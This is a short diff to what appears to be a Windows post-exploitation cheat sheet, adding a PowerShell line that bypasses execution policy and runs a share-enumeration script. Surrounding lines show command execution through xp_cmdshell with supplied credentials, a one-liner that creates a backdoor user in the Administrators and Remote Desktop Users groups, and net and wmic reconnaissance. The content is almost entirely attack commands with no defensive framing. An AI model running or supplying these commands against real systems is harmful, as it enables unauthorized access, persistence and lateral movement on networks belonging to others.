@@ -17,6 +17,8 @@ osql.exe -S <server> -U <username> -P <password> -Q "xp_cmdshell 'whoami'"
 
 net localgroup administrators && net user username password /add && net localgroup administrators username /add && net localgroup "Remote Desktop Users" username /add
 
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -force;Unblock-File -Path ".\Get-NetworkShares.ps1";Import-Module .\Get-NetworkShares.ps1;.\Get-NetworkShares.ps1 -ComputerName HOSTNAME
+
 net view
 net use q: \\share_name
 wmic logicaldisk get name
